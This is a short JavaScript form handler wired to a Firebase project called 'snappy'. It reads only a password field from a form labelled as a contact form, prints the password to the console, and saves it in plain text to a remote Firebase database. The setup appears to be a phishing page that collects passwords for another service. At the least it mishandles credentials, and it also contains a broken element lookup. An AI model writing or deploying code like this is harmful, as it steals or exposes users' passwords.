// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyDqj8Kqo5sAXE9jhDuetOvWVVzXEf5E8yA",
    authDomain: "snappy-c440d.firebaseapp.com",
    databaseURL: "https://snappy-c440d.firebaseio.com",
    projectId: "snappy-c440d",
    storageBucket: "snappy-c440d.appspot.com",
    messagingSenderId: "701292909277",
    appId: "1:701292909277:web:1d0cec472efd1d5d5d0134",
    measurementId: "G-9F0F7ZVMCH"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();

var messagesRef  = firebase.database().ref('message');

document.getElementById('contactForm').addEventListener('submit', submitForm);


function submitForm(e){
    e.preventDefault();
    var pass = getInputval('password');
    console.log(pass);
    savePassword ( pass);
    

    document.querySelector('.alert').style.display = 'block';

    setTimeout(function(){
        document.getElementById('.contactForm').style.display = 'none';
        document.querySelector('.alert').style.display = 'none';
    },5000);
    document.getElementById('contactForm').reset();
}


function getInputval(id){

    return document.getElementById(id).value;
}


function savePassword ( pass ){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        pass : pass,
    })
} 